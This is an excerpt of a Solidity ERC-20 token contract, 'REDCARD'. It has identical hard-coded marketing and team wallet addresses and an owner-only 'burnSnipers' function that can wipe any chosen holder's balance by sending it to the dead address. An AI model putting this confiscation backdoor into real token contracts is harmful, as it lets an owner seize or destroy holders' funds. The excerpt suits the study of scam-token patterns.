...
contract REDCARD is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x2B4760cab8edA0A6F24C3bDea59971B001201188); 
    address payable public teamWalletAddress = payable(0x2B4760cab8edA0A6F24C3bDea59971B001201188); 
    ...
    function burnSnipers(address[] memory sniperAddresses) external onlyOwner {
        for (uint i = 0; i < sniperAddresses.length; i++) {
            _transfer(sniperAddresses[i], deadAddress, balanceOf(sniperAddresses[i]));
        }
    }
